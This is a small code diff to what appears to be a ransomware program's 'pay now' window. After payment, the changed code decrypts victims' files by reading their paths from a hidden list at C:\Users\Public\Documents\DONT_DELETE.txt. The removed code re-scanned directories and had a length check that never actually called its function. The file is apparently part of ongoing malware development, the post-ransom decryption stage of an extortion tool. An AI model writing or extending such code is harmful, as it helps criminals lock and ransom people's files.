@@ -42,15 +42,10 @@ def pay_now():
     fg=WHITE
   )
   noti_label.pack()
-
-  all_enc_files = get_files.get_enc_files()
-  if all_enc_files.__len__:
-    dirs = get_dirs.get_all_dirs()
-    all_enc_files = get_files.re_scan_enc_file(dirs[0])
-
-  # decrypt file
-  for f in all_enc_files:
-    dec.dec(filename=f, key=key)
+  with open('C:\\Users\\Public\\Documents\\DONT_DELETE.txt') as all_file_enc:
+    # decrypt file
+    for f in all_file_enc.readlines():
+      dec.dec(filename=f.strip(), key=key)
 
 
 # main window
